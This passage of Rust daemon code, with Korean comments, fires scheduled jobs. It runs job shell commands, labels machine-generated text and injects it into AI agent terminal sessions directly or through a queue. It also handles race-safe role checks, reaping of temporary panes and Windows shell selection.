    let mut c = tokio::process::Command::new(sh);
    c.arg(flag).arg(cmd).hide_console();
    apply_spawn_env(&mut c); // 동봉 runtime PATH·HOME — 데몬 PATH 로는 python3/printf 미발견
    let fut = c.output();
    let out = match tokio::time::timeout(Duration::from_secs(30), fut).await {
        Ok(Ok(o)) => o,
        Ok(Err(e)) => return Err(format!("text_command spawn 실패: {e}")),
        Err(_) => return Err("text_command 30초 타임아웃".into()),
    };
    if !out.status.success() {
        let err = String::from_utf8_lossy(&out.stderr);
        return Err(format!(
            "text_command 비정상 종료({:?}): {}",
            out.status.code(),
            err.chars().take(200).collect::<String>()
        ));
    }
    // 성공(exit 0)이면 stdout만 push 텍스트로 쓴다. 보고 도구(javis_report)는 진단·실패도
    // stdout 보고문에 담도록 설계됐으므로(예: "cys status 수집 실패"), 성공 경로 stderr는
    // 부차적이라 무시한다 — 비정상 종료(exit≠0)는 위에서 이미 stderr와 함께 에러로 잡힌다.
    let s = String::from_utf8_lossy(&out.stdout).trim().to_string();
    if s.is_empty() {
        return Err("text_command 출력이 비어 있다".into());
    }
    Ok(s)
}

/// ★T-0147-2 층1 **I5 — 인벤토리 예외(명시)**.
///
/// 이 경로(schedule heartbeat inject)는 master stdin 주입자 전수 인벤토리의 I5 항목이고,
/// **W5 범위 밖**이다. 이유: 여기 실리는 잡은 오너가 직접 심은 전자동 사이클 메커니즘이라
/// 라우팅을 자율로 바꾸는 것은 '오너 결정 사항'(설계 §4 유지 리스크·자율 변경 경계)이다.
/// 그래서 **강등하지 않고 계수에서만 명시 제외**한다(M1 예외 예산 — 원장에는 그대로 남는다).
/// 침묵이 아니라 등재된 예외다: 인벤토리에 이름이 있고, 여기 주석이 그 사실을 코드에 못 박는다.
async fn fire_push(daemon: &Arc<Daemon>, job: &Job) -> Result<String, String> {
    let to = job.to.as_deref().ok_or("push job missing 'to'")?;
    // text 결정: text_command가 있으면 데몬이 실행해 stdout을 push 텍스트로 쓴다(결정론 환원).
    // 없으면 정적 text. 둘 다 없으면 에러.
    let text: String = if let Some(cmd) = job.text_command.as_deref() {
        // R2 codex medium: text_command 경로도 같은 셸을 쓰므로 폴백 경고를 동일 배선
        // (command_shell 은 OnceLock 캐시라 재호출 비용 없음).
        #[cfg(windows)]
        {
            let (_s, flag) = command_shell();
            warn_shell_fallback(daemon, flag);
        }
        run_text_command(cmd).await?
    } else {
        job.text
            .as_deref()
            .ok_or("push job missing 'text' or 'text_command'")?
            .to_string()
    };
    // ★R1 심층 방어(원장과 **독립인 2층**): 스케줄 push 는 정의상 기계 유래인데, 라벨 없는 문안
    //   (`--text "다음 액션 착수"`)이 그대로 master stdin 에 꽂히면 in-band 로는 오너 입력과
    //   구별할 수 없었다. 데몬이 발화 시점에 기계 라벨을 **강제 부착**한다 — 클라이언트가
    //   schedule.json 을 손으로 편집해도 우회할 수 없는 자리다(`cys schedule add` 는 파일을
    //   직접 쓰므로 CLI 검증만으로는 부족하다). 이미 라벨이 있는 문안(`[heartbeat] …`·`[wakeup] …`)
    //   은 건드리지 않는다 = 기존 잡 무회귀.
    let text = ensure_machine_label(&text, &job.id);
    let text = text.as_str();

    // fresh 모드: 살아있는 역할이 있어도 무조건 새 surface 기동 → 그 surface에 직접 주입.
    // 역할명은 유일 접미사로 변형 — 원 역할(예: worker)의 살아있는 주소를 탈취하지 않는다.
    // (지침 주입은 role prefix 매칭이라 worker-fresh-*도 WORKER_DIRECTIVE를 받는다)
    if job.fresh {
        let spec = job
            .launch
            .as_ref()
            .ok_or("fresh job requires 'launch' spec")?;
        let mut spec = spec.clone();
        spec.role = format!("{}-fresh-{}", spec.role, now_epoch() as u64);
        let sid = launch_via_cli(daemon, &spec).await?;
        // TTL: fresh surface 누수 차단 — 지정(또는 반복 job 기본) 시간 후 자동 close.
        // 원샷+fresh는 명시 시에만, 반복(time)+fresh는 미설정이어도 기본 TTL로 회수한다.
        // ★(0.14.31 · 리뷰 R1 · codex major) **기동 성공 직후·배달 시도 전**에 건다. 종전에는
        //   `deliver_push(...)?` 뒤였고, 큐 경유가 추가되며 실패 사유(늦은 pause·큐 포화·좌석
        //   소멸)가 늘어났다 — 그 조기 반환은 갓 띄운 좌석을 **회수 약속 없이** 남긴다
        //   (반복 잡이면 매 발화마다 좌석이 단조 누적된다 = 자원 누수).
        // ★(0.14.31 · WP-3 B) fresh 경로에도 같은 배달 선택을 적용한다 — 여기만 직접 주입으로
        //   남기면 `via_queue` 잡이 fresh 옵션 하나로 게이트를 통째 우회한다(같은 계약의 구멍).
        // 갓 띄운 좌석이 곧 대상이다 — 역할 결속은 이 잡의 계약이 아니다.
        //
        // ★(리뷰 R2 · claude minor) 회수 타이머는 **배달을 시도한 뒤** 건다. R1 에서 이 등록을
        //   `deliver_push` 앞으로 옮긴 이유는 "실패로 조기 반환해도 좌석을 회수한다" 였는데,
        //   `effective_close_ttl` 은 `close_after_secs: 0` 을 그대로 Some(0) 으로 돌리므로
        //   멀티스레드 런타임에서 회수가 배달을 **앞지를 수 있었다**(SeatGone·"surface gone").
        //   결과를 손에 쥔 채 등록하면 두 성질을 함께 얻는다: 순서(배달 시도가 먼저)와
        //   무조건성(성공·실패 어느 반환 경로에서도 회수가 걸린다).
        let delivered = deliver_push(daemon, job, sid, text, None);
        if let Some(ttl) = effective_close_ttl(job) {
            let d = Arc::clone(daemon);
            // ★(triage X9) 적재 성공(`"queued"`)은 **배달이 아니다**. 회수는 그 항목의 처분
            //   (배달·만료·폐기)이 정해진 뒤에 한다.
            let await_disposition = matches!(delivered, Ok("queued"));
            let job_id = job.id.clone();
            let timing = ReapTiming::for_job(ttl);
            tokio::spawn(async move {
                reap_fresh_seat(d, sid, job_id, timing, await_disposition).await;
            });
        }
        let how = delivered?;
        return Ok(format!("fresh-launched and {how} (surface:{sid})"));
    }
    let mut sid = daemon.roles.lock().unwrap().get(to).copied();
    // 이 sid 가 **역할 맵에서** 나왔는가(=적재 시점 재검증 대상인가). `if_absent:launch` 로
    // 새로 만든 좌석은 sid 자체가 대상이라 가드를 걸지 않는다.
    let mut from_role_map = sid.is_some();
    // 대상 surface가 죽어 있거나 agent-backed가 아니면(빈 셸) 부재로 간주.
    // agent_meta=None인 surface(new-surface로 만든 빈 zsh 셸)에 자연어 프롬프트를 push하면
    // 셸이 명령으로 해석해 깨진다(예: '[heartbeat]…' → zsh no matches). launch-agent로 등록된
    // 에이전트 pane만 유효 대상 → 빈 셸은 if_absent 규칙으로 처리(owner 보고는 skip).
    if let Some(s) = sid {
        // ★(0.14.31 · 리뷰 R2) 판정은 `alert_route::seat_is_agent_backed` **한 곳**이다.
        //   종전에는 같은 규칙을 여기 인라인으로 복제했고, 경보 라우팅이 그 사본과 갈라져
        //   빈 셸을 목적지로 골랐다. 술어가 하나면 갈라질 수 없다(그 술어는 등록 이력만이
        //   아니라 이미 관측된 부재 증거까지 본다 — Unknown 은 종전대로 통과).
        let valid = daemon
            .get_surface(s)
            .map(|surf| crate::alert_route::seat_is_agent_backed(&surf))
            .unwrap_or(false);
        if !valid {
            sid = None;
            from_role_map = false;
        }
    }

    if sid.is_none() {
        // 값 정규화(trim+소문자) — JSON 직접 편집의 "Skip"·" launch "도 의도대로 처리.
        let if_absent = job
            .if_absent
            .as_deref()
            .map(|s| s.trim().to_ascii_lowercase());
        match if_absent.as_deref() {
            Some("launch") => {
                let spec = job
                    .launch
                    .as_ref()
                    .ok_or("if_absent=launch but no 'launch' spec")?;
                sid = Some(launch_via_cli(daemon, spec).await?);
            }
            // skip: 대상 역할 부재 시 조용히 건너뛴다(Ok) — 에러로 기록하지 않는다.
            // 5분 보고 하트비트처럼 master가 평시 안 떠 있을 수 있는 job이 schedule.error를
            // 매 주기 쌓는 것을 차단한다(보고 '누락'은 무해, '에러 누적'은 모니터링 오염).
            Some("skip") => return Ok(format!("skipped: role '{to}' absent (if_absent=skip)")),
            // 미설정: 의도 불명 — 기존대로 에러로 알린다(설정 누락을 숨기지 않는다).
            _ => return Err(format!("role '{to}' absent (set if_absent=launch|skip)")),
        }
    }
    let sid = sid.ok_or_else(|| format!("role '{to}' absent"))?;
    let guard = from_role_map.then(|| crate::alert_route::RoleGuard::Exact(to));
    let how = deliver_push(daemon, job, sid, text, guard)?;
    Ok(format!("{how} to {to} (surface:{sid})"))
}

/// ★(0.14.31 · WP-3 B) 대상 좌석이 확정된 **뒤** 배달 방식을 고른다 — 큐 경유 또는 직접 주입.
///
/// 대상 선택(`fresh`·`if_absent`·빈 셸 판정)은 **위에서 이미 끝났다**: 그 앞에 끼워 넣으면
/// 기존 잡들의 대상 의미가 조용히 바뀐다. 반대로 마지막 `inject` 한 곳만 바꾸면 `fresh` 경로가
/// 게이트를 계속 우회한다 — 그래서 두 주입 지점이 **같은 이 함수**를 부른다.
///
/// 큐 경유는 배달 원장을 여기서 쓰지 않는다: 큐 배달 경로가 선기록(origin `queue`)과 영수증을
/// 자기 시점에 남긴다(여기서 `record_audited` 를 또 하면 한 발화가 원장에 두 번 남는다).
/// 큐 포화·좌석 소멸은 **에러**다 — 성공으로 보고하면 발화가 사라진 사실이 묻힌다.
///
/// 【`role_guard`】 대상 sid 를 **역할 맵에서 골랐다면** 적재 시점에 그 결속이 아직 유효한지
/// 다시 본다(리뷰 R1 · codex 추가지적). 역할 조회와 적재가 다른 트랜잭션이라, 그 사이에
/// `claim_role` 인계가 끝나면 정기 점검이 **버려진 셸**로 들어간다. 갓 띄운 좌석(`fresh`·
/// `if_absent:launch`)은 sid 자체가 대상이므로 가드를 걸지 않는다(걸면 launch 직후의
/// 등록 지연이 곧 실패가 된다).
fn deliver_push(
    daemon: &Arc<Daemon>,
    job: &Job,
    sid: u64,
    text: &str,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
) -> Result<&'static str, String> {
    if !job.uses_queue() {
        // ★(0.14.31 · 리뷰 R2 · claude minor) 직접 주입 분기도 **같은 역할 가드**를 받는다.
        //   종전에는 큐 경유 분기에만 가드가 있었고, 그래서 기존 builtin push(하트비트 등)는
        //   선택과 주입 사이의 인계 경쟁이 그대로였다 — 인계가 끝난 뒤 구 좌석에 주입하면
        //   그 문안은 버려진 셸에 타이핑된다.
        //   좌석 조회와 역할 재검증을 **한 임계영역**에서 하고(락 순서 surfaces → roles =
        //   `close_surface`·`claim_role` 과 동순), 그렇게 확정한 `Arc<Surface>` 로 주입한다.
        //   ★정직한 한계: PTY 쓰기까지 락을 쥘 수는 없으므로(원장 I/O·writer 채널) 검증
        //   **직후**의 인계는 여전히 지나간다. 큐 경유 경로도 삽입 이후에는 같은 성질이다.
        let surface = resolve_push_target(daemon, sid, role_guard)?;
        inject_on(daemon, &surface, text)?;
        return Ok("pushed");
    }
    crate::alert_route::enqueue_into_seat(
        daemon,
        sid,
        text.to_string(),
        // ★(0.14.31 · 리뷰 R1 · claude minor) 발신 라벨은 **그 잡** 이다. 종전에는 데몬 경보의
        //   `"daemon"` 을 그대로 넘겨, 원장(`delivery::split_queue_from` → `from_label`)에
        //   스케줄 발화가 데몬 경보로 찍혔다 — 스케줄 축으로 집계하는 소비자에게는 이 잡의
        //   발화가 보이지 않았다. surface ref 형식이 아니므로 `from_label` 로 간다(§8 준수).
        Some(format!("{SCHEDULE_QUEUE_ORIGIN}:{}", job.id)),
        SCHEDULE_QUEUE_ORIGIN,
        SCHEDULE_QUEUE_CAP,
        role_guard,
    )
    .map(|_| "queued")
    .map_err(|e| format!("via_queue enqueue failed: {}", e.as_str()))
}

/// 선두 라벨(`[...]`) 유무 판정 — 판독자 `javis_mission._label_head` 와 **같은 규칙**이다:
/// 선행 공백과 투명문자(Cf: ZWSP/ZWNJ/ZWJ/BOM/word-joiner 등)를 벗긴 뒤 첫 글자가
/// `[`(U+005B) 또는 전각 `［`(U+FF3B) 이면 라벨이다. **길이 상한은 두지 않는다** —
/// 종전 80자 창은 그 자체가 공격 표적이었다(80자 넘는 라벨로 우회).
///
/// ★정직한 한계: 투명문자 집합은 python 쪽이 `unicodedata` 로 Cf **전체**를 보는 반면 여기는
///   실사용 목록만 열거한다. 두 판정은 **독립 층**이라(여기=부착 강제 / python=수신 판별)
///   불일치의 결과는 "이미 라벨인 문안에 라벨을 한 번 더 붙일 뻔한다" 정도이고, 그마저도
///   양쪽 목록에 없는 희귀 Cf 로 시작하는 문안에서만 일어난다 — 안전 방향의 차이다.
fn has_machine_label(text: &str) -> bool {
    for ch in text.chars() {
        if ch.is_whitespace() {
            continue;
        }
        // Cf(format)·zero-width 류: 눈에 안 보이는 선두 문자로 라벨 판정을 비껴가는 우회 차단.
        if matches!(ch, '\u{200b}'..='\u{200f}' | '\u{2060}'..='\u{2064}' | '\u{feff}' | '\u{00ad}' | '\u{061c}' | '\u{180e}' | '\u{2066}'..='\u{2069}' | '\u{202a}'..='\u{202e}')
        {
            continue;
        }
        return ch == '[' || ch == '\u{ff3b}';
    }
    false
}

/// ★(성찰 A4 · blocking) fresh 좌석의 **회수** — 미완료 항목이 있으면 닫지 않는다.
///
/// 종전 배선: `sleep(ttl)` → 처분을 최대 1,800초 기다림 → **무조건** `close_surface(Reap)`.
/// 그 마지막 한 줄이 조건 없는 폐기였다. `push_queued + fresh:true + close_after_secs:0`
/// (→ 하한 60초) 적재 후 승인 대기가 1,800초를 넘으면 활성 큐에 항목이 남아 있는데도 좌석이
/// 닫히고, 그 항목은 `record_active_drain(…, "surface_closed")` + `queue.dropped` 로 폐기된다 —
/// 잡의 일감은 끝내 실행되지 않는데 그 사실은 이미 `schedule.fired{detail:"queued"}`(성공)로
/// 보고된 뒤다. 게다가 [`surface_queue_pending`] 은 좌석이 사라지면 `false` 라
/// "처분이 정해졌다" 와 "좌석이 없어졌다" 가 **같은 모양**이었다.
///
/// 이제 시간 상한은 **회수 보류 + 안내 이벤트**다: 유예([`QUEUED_DELIVERY_GRACE_SECS`])를
/// 넘기면 `schedule.fresh_reap_deferred` 를 한 번 내고(그 뒤로는
/// [`QUEUED_DEFER_NOTICE_INTERVAL_SECS`] 간격으로 되풀이) **계속 기다린다**. 대기의 실질
/// 상한은 큐 항목 자신의 TTL 이 진다 — 배달이든 만료든 처분이 정해지면 즉시 회수된다.
/// 좌석이 이미 사라진 경우도 `close_surface` 가 멱등이라 그대로 지나간다.
/// 회수 타이머의 **네 시간축** — 프로덕션은 상수에서, 검체는 같은 비율의 압축 시계에서 만든다
/// (`tokio` 의 `test-util`(가상시간)은 이 크레이트의 feature 집합에 없다 — 축을 값으로 빼서
///  같은 배선을 그대로 돌린다). 세 번째와 네 번째가 종전에 **한 상수**로 묶여 있었다.
#[derive(Clone, Copy, Debug)]
struct ReapTiming {
    /// 좌석 회수까지의 기본 유예(잡의 `close_after_secs` · 큐 경유면 하한 60초).
    ttl: Duration,
    /// 처분 미정 상태에서 **안내를 내기 시작하는** 경계(회수 시각이 아니다).
    grace: Duration,
    /// 처분 확인 간격.
    poll: Duration,
    /// 유예를 넘긴 뒤 안내를 되풀이하는 간격.
    notice: Duration,
}

impl ReapTiming {
    fn for_job(ttl_secs: u64) -> Self {
        Self {
            ttl: Duration::from_secs(ttl_secs),
            grace: Duration::from_secs(QUEUED_DELIVERY_GRACE_SECS),
            poll: Duration::from_secs(QUEUED_CLOSE_POLL_SECS),
            notice: Duration::from_secs(QUEUED_DEFER_NOTICE_INTERVAL_SECS),
        }
    }

    /// 검체 전용 — **1000배 압축**(1초 → 1밀리초). 경계 건수·순서는 프로덕션과 동일하다.
    #[cfg(test)]
    fn compressed(ttl_secs: u64) -> Self {
        Self {
            ttl: Duration::from_millis(ttl_secs),
            grace: Duration::from_millis(QUEUED_DELIVERY_GRACE_SECS),
            poll: Duration::from_millis(QUEUED_CLOSE_POLL_SECS),
            notice: Duration::from_millis(QUEUED_DEFER_NOTICE_INTERVAL_SECS),
        }
    }
}

async fn reap_fresh_seat(
    d: Arc<Daemon>,
    sid: u64,
    job_id: String,
    t: ReapTiming,
    await_disposition: bool,
) {
    tokio::time::sleep(t.ttl).await;
    if await_disposition {
        let mut waited = Duration::ZERO;
        let mut since_notice = t.notice;
        // ★좌석 소멸과 처분 확정을 **가른다**: 좌석이 없어졌으면 더 기다릴 대상이 없다.
        //   ([`surface_queue_pending`] 하나만 보면 두 사실이 같은 `false` 로 접힌다.)
        while d.get_surface(sid).is_some() && surface_queue_pending(&d, sid) {
            if waited >= t.grace && since_notice >= t.notice {
                d.bus.publish(
                    "schedule.fresh_reap_deferred",
                    "schedule",
                    Some(sid),
                    json!({"job": job_id, "surface_id": sid,
                           "waited_secs": waited.as_secs(), "waited_ms": waited.as_millis() as u64,
                           "grace_secs": QUEUED_DELIVERY_GRACE_SECS,
                           "note": "적재된 일감의 처분이 아직 정해지지 않았다 — 좌석을 회수하지 않는다(회수하면 그 일감이 폐기된다)"}),
                );
                since_notice = Duration::ZERO;
            }
            tokio::time::sleep(t.poll).await;
            waited += t.poll;
            since_notice += t.poll;
        }
    }
    let _ = crate::governance::close_surface(&d, sid, crate::governance::CloseCause::Reap);
}

/// 그 좌석의 활성 큐에 아직 배달되지 않은 항목이 남아 있는가(처분 미정) — 좌석이 없으면 false.
fn surface_queue_pending(daemon: &Arc<Daemon>, sid: u64) -> bool {
    daemon
        .get_surface(sid)
        .is_some_and(|s| !s.pending_queue.lock().unwrap_or_else(|e| e.into_inner()).is_empty())
}

/// 라벨이 없으면 `[schedule <job-id>] ` 을 앞에 붙인다(실물 라벨 규약 `[wakeup <W-id>]` 와 동형).
fn ensure_machine_label(text: &str, job_id: &str) -> String {
    if has_machine_label(text) {
        return text.to_string();
    }
    format!("[schedule {job_id}] {text}")
}

/// 대상 좌석을 **한 임계영역**에서 확정한다 — 존재·생존·역할 결속을 함께 본다.
/// 락 순서: surfaces → roles(`close_surface`·`claim_role` 과 동순 · AB-BA 없음).
fn resolve_push_target(
    daemon: &Arc<Daemon>,
    sid: u64,
    role_guard: Option<crate::alert_route::RoleGuard<'_>>,
) -> Result<Arc<crate::state::Surface>, String> {
    let surfaces = daemon.surfaces.lock().unwrap();
    let surface = surfaces.get(&sid).cloned().ok_or("surface gone")?;
    if let Some(guard) = role_guard {
        let roles = daemon.roles.lock().unwrap();
        if !roles.iter().any(|(r, s)| *s == sid && guard.matches(r)) {
            return Err("role handed over between selection and inject".to_string());
        }
    }
    Ok(surface)
}

/// 살아있는 세션의 stdin에 과업을 주입 (bracketed paste + Return).
/// 전체 시퀀스가 writer 스레드의 단일 Inject 항목으로 직렬화돼
/// 동시 발화·동시 배달과 섞이지 않는다 (메시지 병합·오염 차단).
/// 확정된 좌석에 주입한다(조회를 다시 하지 않는다 — 확정과 주입 사이에 좌석이 바뀌지 않게).
fn inject_on(
    daemon: &Arc<Daemon>,
    surface: &Arc<crate::state::Surface>,
    text: &str,
) -> Result<(), String> {
    let sid = surface.id;
    // ★R1 배달 원장 — 주입보다 앞(delivery.rs 불변식 ①). 자기 예약 wake
    //   (`cys schedule add --text "[wakeup] 다음 액션 착수" --to master`)가 시간이 지나
    //   stdin 으로 돌아오는 경로가 바로 여기다.
    crate::delivery::record_audited(
        daemon,
        sid,
        text,
        crate::delivery::Origin::Schedule,
        None,
    );
    surface
        .write_tx
        .try_send(crate::state::WriteReq::Inject {
            text: text.to_string(),
            cr_delay_ms: 500,
            clear_first: false, // 스케줄 발화는 현행 동작 보존
            guard: None,        // 스케줄 push 는 큐를 우회한다(§8) — 가드 대상 아님
        })
        .map_err(|e| match e {
            std::sync::mpsc::TrySendError::Full(_) => {
                "surface write channel full (pane stalled)".to_string()
            }
            std::sync::mpsc::TrySendError::Disconnected(_) => "surface writer closed".to_string(),
        })
}

/// 부재 역할 자동 기동: 데몬이 형제 CLI의 launch-agent를 호출 (준비 폴링·지침 주입 재사용)
async fn launch_via_cli(daemon: &Arc<Daemon>, spec: &LaunchSpec) -> Result<u64, String> {
    use cys::SpawnPolicy;
    let cli = crate::state::sibling_cli_path();
    let mut cmd = tokio::process::Command::new(cli);
    cmd.arg("launch-agent")
        .arg("--role")
        .arg(&spec.role)
        .arg("--agent")
        .arg(&spec.agent)
        .env(
            cys::ENV_SOCKET,
            daemon.socket_path.to_string_lossy().as_ref(),
        )
        // ★U-7 결손 보강: 데몬이 낳는 **다른 CLI 자식은 전부** 이걸 걸고 있었는데
        // (main.rs 의 office-bridge·auto-restore·phoenix self-test) 여기만 빠져 있었다.
        // 없으면 이 자식 cys 가 소켓 연결에 실패했을 때 `spawn_detached_daemon` 으로
        // **라이벌 데몬을 낳는다** — 데몬 종료 중·소켓 교체 중에 정확히 그 창이 열린다.
        // 자기 데몬이 자기 경쟁자를 스폰하는 재귀 기동은 폭주(치명위험 ①) 경로다.
        .no_autostart()
        // ★U-7 등급 `Attached` — 아래에서 `.output()` 으로 **끝까지 기다리는** 유계 자식이다.
        // 분리하면 안 된다: 부모가 죽으면 함께 죽는 것이 정상 동작이고, 떼는 순간
        // 180초 상한이 걸린 이 호출이 남긴 자식이 고아로 잔존한다.
        // (flag 는 종전 `hide_console()` 과 동일한 CREATE_NO_WINDOW — 행동 무변경.)
        .spawn_policy(cys::ChildLifetime::Attached);
    if let Some(cwd) = &spec.cwd {
        cmd.arg("--cwd").arg(cwd);
    }
    // hang된 launch-agent가 fire 태스크를 영구 점유하지 않게 상한
    let out = tokio::time::timeout(Duration::from_secs(180), cmd.output())
        .await
        .map_err(|_| "launch-agent timed out (180s)".to_string())?
        .map_err(|e| format!("launch-agent spawn failed: {e}"))?;
    // ★(U-11) 종전엔 `success()` 1비트였다 — '깨졌다'와 '떴는데 사람이 관문을 통과시켜야
    //   한다'가 같은 값이었고, 그래서 진단 문안이 늘 "기동 실패"였다. 이제 세 갈래로 읽는다:
    //   성공 / **사람 필요**(surface 는 살아 있다) / 그 밖 실패.
    //   ★보류는 여전히 `Err` 다 — 그것이 이 함수의 계약에서 옳다. 호출부는 반환된 sid 에
    //   **곧바로 텍스트를 주입**하는데(`inject(daemon, sid, text)`), 관문 창에 주입하면 그
    //   붙여넣기의 Return 이 실측상 면책 창의 `No, exit` 을 눌러 노드를 종료시킨다.
    //   즉 여기서 Ok 를 내는 것은 '스케줄 job 한 건 성공' 이 아니라 '노드 1개 사망' 이다.
    if out.status.code() == Some(cys::EXIT_GATE_PENDING) {
        return Err(format!(
            "launch-agent gate-pending: pane 은 떴고 프로세스도 살아 있으나 첫기동 관문(테마·\
             로그인방식·OAuth·폴더신뢰·면책·새기능안내)에 갇혀 입력을 받지 못한다 — 좌석은 \
             닫지 않았다. 사람이 그 pane 에서 관문을 1회 통과시킨 뒤 재시도하라(`cys list` 로 \
             해당 pane 확인).\n{}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    if !out.status.success() {
        return Err(format!(
            "launch-agent failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        ));
    }
    // launch-agent는 마지막 줄에 surface ref를 출력한다
    let sid = String::from_utf8_lossy(&out.stdout)
        .lines()
        .rev()
        .find_map(|l| aiterm_parse(l.trim()))
        .ok_or("launch-agent did not print a surface ref")?;
    Ok(sid)
}

fn aiterm_parse(s: &str) -> Option<u64> {
    cys::parse_surface_ref(s)
}

/// ★0.14.1 수리 세대 마커 — 릴리스 게이트(scripts/verify_win_crt.py)가 출하 cysd 바이너리에서
/// 이 바이트열의 실재를 단언해 구베이스(0.14.3 이하) 빌드 출하를 차단한다.
/// **live RPC 가 참조하는 상수**라 어떤 플랫폼 링커도 제거할 수 없다 — `#[used]` static 은
/// MSVC link.exe 의 미참조 제거(/OPT:REF)에 소거됨을 CI run 30359522750 에서 실증(0/1),
/// 코드 경로 문자열 휴리스틱은 run 30357918475 에서 붕괴(부분열·컴파일러 재량). 3세대 메커니즘.
/// 부수 효용: `cys schedule list`(status RPC)에 fix_generation 으로 노출 — 현장 진단에서
/// 설치본의 수리 세대를 즉시 판별할 수 있다.
pub const FIX_GENERATION: &str = "cys-fix-w2-gen-0.14.4";

/// 후보 디렉토리에서 동봉 `bash.exe` 절대경로를 찾는다(순수 — 회귀 핀·OS 무관 컴파일).
/// 첫 실재 파일이 승자(후보 순서 = 우선순위). 없으면 None.
#[cfg(any(windows, test))]
fn resolve_bash_in(dirs: impl IntoIterator<Item = PathBuf>) -> Option<PathBuf> {
    dirs.into_iter()
        .map(|d| d.join("bash.exe"))
        .find(|c| c.is_file())
}

/// Windows 동봉 bash 후보 디렉토리(우선순위 순). runtime_bin_dirs(실재 디렉토리만)가 SOT이고,
/// PortableGit 의 `bash.exe` 정규 위치(`runtime/git/bin`)를 보수적으로 덧댄다 — runtime_bin_dirs 는
/// PATH 주입용이라 git/bin 을 싣지 않는데(그 자리엔 sh·bash 뿐), 셸 탐지는 그 디렉토리가 본진이다.
#[cfg(windows)]
fn windows_bash_candidates(exe_dir: &std::path::Path) -> Vec<std::path::PathBuf> {
    let mut dirs = cys::runtime_bin_dirs(exe_dir);
    dirs.push(exe_dir.join("runtime").join("git").join("bin"));
    dirs
}

/// 플랫폼별 셸 호출자 (program, flag).
/// Windows: **동봉 Git Bash 우선**(v0.13.22 백포트 · 2026-07-28). 데몬 built-in 잡 페이로드는 전부
///   POSIX 문법(`${VAR:-...}` 전개·`;` 연쇄·printf/tail 파이프)이라 cmd.exe 로는 파싱조차 되지 않아
///   윈도우 전원에서 주기 잡이 통째로 불능이었다. 동봉 PortableGit 의 bash.exe 를 찾으면
///   (절대경로, "-c")로 승격하고, 미탐지(비동봉 설치)일 때만 종전 cmd 폴백을 유지한다.
///   탐지는 프로세스 1회만(OnceLock) — 매 발화 파일시스템 조회를 피한다.
/// unix: 종전 그대로 ("sh","-c") — 무변경.
fn command_shell() -> (String, &'static str) {
    #[cfg(windows)]
    {
        static BASH: std::sync::OnceLock<Option<String>> = std::sync::OnceLock::new();
        let found = BASH.get_or_init(|| {
            std::env::current_exe()
                .ok()
                .and_then(|p| p.parent().map(|d| d.to_path_buf()))
                .and_then(|d| resolve_bash_in(windows_bash_candidates(&d)))
                .map(|p| p.to_string_lossy().into_owned())
        });
        match found {
            Some(bash) => (bash.clone(), "-c"),
            None => ("cmd".to_string(), "/C"),
        }
    }
    #[cfg(not(windows))]
    {
        ("sh".to_string(), "-c")
    }
}

/// 폴백 경고 재발행 판정(순수 — 회귀 핀·OS 무관 컴파일). cmd 폴백(flag=="/C")일 때
/// 미발행(last=0)이거나 마지막 발행에서 1시간 이상 지났으면 true.
/// ★R2 codex medium 수용: 종전 프로세스당 1회(AtomicBool)는 첫 발행이 구독자 부재 시점에
/// 떨어지면 프로세스 생존 내내 재발행이 없어 사실상 무음으로 회귀했다 — 유계 재발행으로 교체.
#[cfg(any(windows, test))]
fn should_warn_fallback(flag: &str, last_emit_epoch: u64, now_epoch: u64) -> bool {
    const THROTTLE_SECS: u64 = 3600;
    if flag != "/C" {
        return false;
    }
    last_emit_epoch == 0 || now_epoch.saturating_sub(last_emit_epoch) >= THROTTLE_SECS
}

/// ★폴백 가시화(0.14.1 강화 — 상류에 없음): Windows에서 동봉 bash 미탐지로 cmd /C 폴백이 선택되면
/// schedule.warning 을 발행한다(시간당 최대 1회 — should_warn_fallback). 폴백은 POSIX 페이로드 잡의
/// 확정 실패 경로인데, 종전엔 그 사실 자체가 어디에도 표면화되지 않았다(무음 금지 원칙). 실패 개별
/// 건은 A1(schedule.error)이 잡고, 이 경고는 "왜 전부 실패하는가"의 근본 원인을 알린다.
/// command·text_command **양 경로 공통**으로 호출한다(fire_command·fire_push).
#[cfg(windows)]
fn warn_shell_fallback(daemon: &Arc<Daemon>, flag: &str) {
    use std::sync::atomic::{AtomicU64, Ordering};
    static LAST_EMIT: AtomicU64 = AtomicU64::new(0);
    let now = now_epoch() as u64;
    let last = LAST_EMIT.load(Ordering::Relaxed);
    if should_warn_fallback(flag, last, now)
        && LAST_EMIT
            .compare_exchange(last, now, Ordering::Relaxed, Ordering::Relaxed)
            .is_ok()
    {
        daemon.bus.publish(
            "schedule.warning",
            "schedule",
            None,
            json!({"kind": "shell-fallback",
                   "detail": "동봉 bash.exe 미탐지 — cmd /C 폴백. POSIX 페이로드 잡은 실패한다(schedule.error 로 개별 표면화)"}),
        );
    }
}

/// 스케줄 발화 자식에 얹을 env 주입 쌍 — ★T-0147-7 W1a(A17)에서 **`cys::spawn_env_pairs` 로 승격**했다.
/// 같은 규약(PATH 선두주입 + HOME←USERPROFILE backfill)이 pane 스폰(state.rs)에도 필요한데 사본이
/// 없어 Windows pane 이 `$HOME` 붕괴로 훅 발화를 잃었다 — 사본 증식 대신 lib 단일 소유로 옮겼다.
/// 회귀 핀(아래 `spawn_env_injects_runtime_path_and_backfills_home`)은 이제 `cys::spawn_env_pairs`
/// 를 직접 호출해 **lib 구현 자체**를 결박한다 — 사본이 아니라 SOT 를 검증한다(RC1).
///
/// ★SEAL-1 판정(2026-08-01): `schedule.json`·빌트인 잡의 `python3 …javis_*.py` 페이로드에는
/// `PYTHONDONTWRITEBYTECODE=1` 접두를 **넣지 않는다** — 잡은 전부 이 함수를 거쳐 스폰되고
/// `spawn_env_pairs` 가 그 쌍을 이미 싣기 때문이다(페이로드마다 접두를 박으면 잡이 추가될 때
/// 또 빠지는 규약 산재가 된다). 즉 잡 명령은 무변경이고 봉인은 env 상속으로 달성된다.
///
/// spawn_env_pairs 를 현재 프로세스 env 로 계산해 명령에 적용한다(run_text_command·fire_command 공용).
fn apply_spawn_env(cmd: &mut tokio::process::Command) {
    let exe_dir = std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.to_path_buf()))
        .unwrap_or_else(|| PathBuf::from("."));
    for (k, v) in cys::spawn_env_pairs_from_process(&exe_dir) {
        cmd.env(k, v);
    }
}

/// ★T-0147-2 §1-B N6b / 층1 I2 — 게이트 신호 allowlist(deny-by-default).
///
